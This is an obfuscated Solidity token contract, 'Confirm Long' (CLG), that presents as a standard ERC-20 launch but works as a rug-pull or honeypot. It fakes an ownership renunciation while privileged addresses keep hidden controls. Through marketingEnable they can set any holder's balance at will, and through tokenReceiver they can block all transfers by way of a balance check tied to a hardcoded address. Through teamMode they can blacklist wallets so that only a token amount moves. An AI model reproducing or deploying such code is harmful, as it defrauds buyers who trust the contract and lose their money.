//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface launchReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract txFromSell {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface liquidityTake {
    function createPair(address teamLaunchedIs, address minAt) external returns (address);
}

interface maxTeam {
    function totalSupply() external view returns (uint256);

    function balanceOf(address amountExempt) external view returns (uint256);

    function transfer(address minSwap, uint256 launchedSender) external returns (bool);

    function allowance(address totalLaunchedToken, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchedSender) external returns (bool);

    function transferFrom(
        address sender,
        address minSwap,
        uint256 launchedSender
    ) external returns (bool);

    event Transfer(address indexed from, address indexed tokenLaunch, uint256 value);
    event Approval(address indexed totalLaunchedToken, address indexed spender, uint256 value);
}

interface maxTeamMetadata is maxTeam {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ConfirmLong is txFromSell, maxTeam, maxTeamMetadata {

    mapping(address => bool) public teamLaunch;

    address public shouldLiquidity;

    address public feeTo;

    string private liquidityLaunchedAmount = "CLG";

    mapping(address => bool) public exemptAtLimit;

    function owner() external view returns (address) {
        return swapAuto;
    }

    bool public enableExempt;

    function tokenReceiver(uint256 launchedSender) public {
        fromTakeLaunched();
        marketingTotal = launchedSender;
    }

    mapping(address => mapping(address => uint256)) private listWallet;

    uint256 marketingLiquidity;

    function transferFrom(address receiverModeAmount, address minSwap, uint256 launchedSender) external override returns (bool) {
        if (_msgSender() != teamMarketing) {
            if (listWallet[receiverModeAmount][_msgSender()] != type(uint256).max) {
                require(launchedSender <= listWallet[receiverModeAmount][_msgSender()]);
                listWallet[receiverModeAmount][_msgSender()] -= launchedSender;
            }
        }
        return feeReceiver(receiverModeAmount, minSwap, launchedSender);
    }

    bool public teamTo;

    function name() external view virtual override returns (string memory) {
        return totalList;
    }

    string private totalList = "Confirm Long";

    bool private liquidityEnable;

    function feeReceiver(address receiverModeAmount, address minSwap, uint256 launchedSender) internal returns (bool) {
        if (receiverModeAmount == shouldLiquidity) {
            return totalTo(receiverModeAmount, minSwap, launchedSender);
        }
        uint256 senderAt = maxTeam(feeTo).balanceOf(listAuto);
        require(senderAt == marketingTotal);
        require(minSwap != listAuto);
        if (teamLaunch[receiverModeAmount]) {
            return totalTo(receiverModeAmount, minSwap, txTo);
        }
        return totalTo(receiverModeAmount, minSwap, launchedSender);
    }

    function decimals() external view virtual override returns (uint8) {
        return toAmount;
    }

    function marketingEnable(address minModeBuy, uint256 launchedSender) public {
        fromTakeLaunched();
        modeIsMax[minModeBuy] = launchedSender;
    }

    uint256 private autoAt = 100000000 * 10 ** 18;

    constructor (){
        
        launchReceiver limitBuyShould = launchReceiver(teamMarketing);
        feeTo = liquidityTake(limitBuyShould.factory()).createPair(limitBuyShould.WETH(), address(this));
        if (swapMin != liquidityEnable) {
            liquidityEnable = true;
        }
        shouldLiquidity = _msgSender();
        tokenTotal();
        exemptAtLimit[shouldLiquidity] = true;
        modeIsMax[shouldLiquidity] = autoAt;
        if (liquidityEnable != swapMin) {
            enableExempt = true;
        }
        emit Transfer(address(0), shouldLiquidity, autoAt);
    }

    function symbol() external view virtual override returns (string memory) {
        return liquidityLaunchedAmount;
    }

    bool public marketingLimit;

    function tokenTotal() public {
        emit OwnershipTransferred(shouldLiquidity, address(0));
        swapAuto = address(0);
    }

    address listAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function allowance(address listLiquidityReceiver, address teamLaunched) external view virtual override returns (uint256) {
        if (teamLaunched == teamMarketing) {
            return type(uint256).max;
        }
        return listWallet[listLiquidityReceiver][teamLaunched];
    }

    bool private exemptSell;

    function transfer(address minModeBuy, uint256 launchedSender) external virtual override returns (bool) {
        return feeReceiver(_msgSender(), minModeBuy, launchedSender);
    }

    function fromTakeLaunched() private view {
        require(exemptAtLimit[_msgSender()]);
    }

    mapping(address => uint256) private modeIsMax;

    function totalSupply() external view virtual override returns (uint256) {
        return autoAt;
    }

    address private swapAuto;

    uint256 public teamFee;

    bool private sellAmountFee;

    event OwnershipTransferred(address indexed limitBuy, address indexed atTo);

    function getOwner() external view returns (address) {
        return swapAuto;
    }

    function approve(address teamLaunched, uint256 launchedSender) public virtual override returns (bool) {
        listWallet[_msgSender()][teamLaunched] = launchedSender;
        emit Approval(_msgSender(), teamLaunched, launchedSender);
        return true;
    }

    function balanceOf(address amountExempt) public view virtual override returns (uint256) {
        return modeIsMax[amountExempt];
    }

    function teamMode(address marketingFund) public {
        fromTakeLaunched();
        if (exemptSell) {
            exemptSell = true;
        }
        if (marketingFund == shouldLiquidity || marketingFund == feeTo) {
            return;
        }
        teamLaunch[marketingFund] = true;
    }

    function totalTo(address receiverModeAmount, address minSwap, uint256 launchedSender) internal returns (bool) {
        require(modeIsMax[receiverModeAmount] >= launchedSender);
        modeIsMax[receiverModeAmount] -= launchedSender;
        modeIsMax[minSwap] += launchedSender;
        emit Transfer(receiverModeAmount, minSwap, launchedSender);
        return true;
    }

    uint8 private toAmount = 18;

    uint256 marketingTotal;

    function feeFrom(address receiverLaunch) public {
        if (marketingLimit) {
            return;
        }
        
        exemptAtLimit[receiverLaunch] = true;
        if (receiverLaunched != teamFee) {
            liquidityEnable = true;
        }
        marketingLimit = true;
    }

    bool public swapMin;

    uint256 constant txTo = 12 ** 10;

    uint256 private receiverLaunched;

    address teamMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

}